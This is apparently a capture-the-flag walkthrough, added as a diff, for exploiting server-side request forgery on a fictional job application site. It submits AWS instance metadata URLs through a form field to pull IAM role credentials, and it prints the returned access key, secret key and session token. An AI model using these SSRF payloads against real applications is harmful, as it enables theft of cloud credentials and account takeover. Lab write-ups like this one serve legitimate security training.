@@ -1,0 +1,43 @@
+https://apply.jackfrosttower.com/
+Objective: find secret access key for the Jack Frost Tower job applications server.
+Hint: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
+Reference: https://portswigger.net/web-security/ssrf
+
+
+(Using Burp Suite to read the raw responses, because Chrome dev tool tries to interpret the response and doesn't give the info we want.)
+(Have Intercept off because we don't need to craft package being sent.)
+  Burp Suite > Proxy > Open Browser > access the website for the attack.
+  Burp Suite > Proxy > HTTP history > to read the raw response.
+
+
+(Access the job application page.)
+https://apply.jackfrosttower.com/?p=apply
+
+
+(Submit any name (required, example Vin0xA2) and with a IMDS url to get meta-data in the URL field of the form)
+http://169.254.169.254/latest/meta-data/
+
+
+(Go to HTTP history and view the event that GET a jpg with the name you entered previously)
+(Example /images/Vin0xA2.jpg)
+(The raw response will have a list of metadata at the end)
+
+
+(iam/security-credentials/jf-deploy-role is an interesting metadata)
+(Go back and resubmit the application with the new URL)
+http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role
+
+
+(Back to HTTP history to see the new response for the jpg file)
+    {
+	"Code": "Success",
+	"LastUpdated": "2021-05-02T18:50:40Z",
+	"Type": "AWS-HMAC",
+	"AccessKeyId": "AKIA5HMBSK1SYXYTOXX6",
+	"SecretAccessKey": "CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX",
+	"Token": "NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==",
+	"Expiration": "2026-05-02T18:50:40Z"
+    }
+
+
+Secret Access Key: CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX
